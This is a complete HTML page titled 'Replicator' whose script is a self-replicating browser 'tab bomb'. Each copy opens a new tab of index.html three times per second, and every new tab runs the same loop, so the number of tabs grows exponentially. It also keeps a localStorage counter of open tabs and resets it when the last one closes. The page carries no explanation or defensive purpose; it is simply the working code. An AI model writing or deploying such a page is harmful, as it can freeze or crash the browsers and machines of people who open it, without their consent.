<!DOCTYPE html>
<html>
<head><title>Replicator</title></head>
<body style="background:#000;color:red;font-family:monospace;text-align:center;">
    <h2>REPLICATING...</h2>
    <script>
        const myID = "tab_" + Math.random().toString(36).substr(2, 9);
        
        // 1. Increment Total
        let total = parseInt(localStorage.getItem('global_total')) || 0;
        localStorage.setItem('global_total', total + 1);

        // 2. Heartbeat
        setInterval(() => {
            localStorage.setItem(myID, Date.now());
        }, 1000);

        // 3. Spawner (3 per second)
        setInterval(() => {
            window.open("index.html", "_blank");
        }, 333); 

        // 4. Emergency Reset: If this is the ONLY tab left and it closes, clear everything
        window.onbeforeunload = function() {
            localStorage.removeItem(myID);
            // We check if any other tabs are left. If not, reset the total.
            let remaining = 0;
            for(let i=0; i<localStorage.length; i++) {
                if(localStorage.key(i).startsWith("tab_")) remaining++;
            }
            if(remaining <= 0) {
                localStorage.setItem('global_total', 0);
            }
        };
    </script>
</body>
</html>
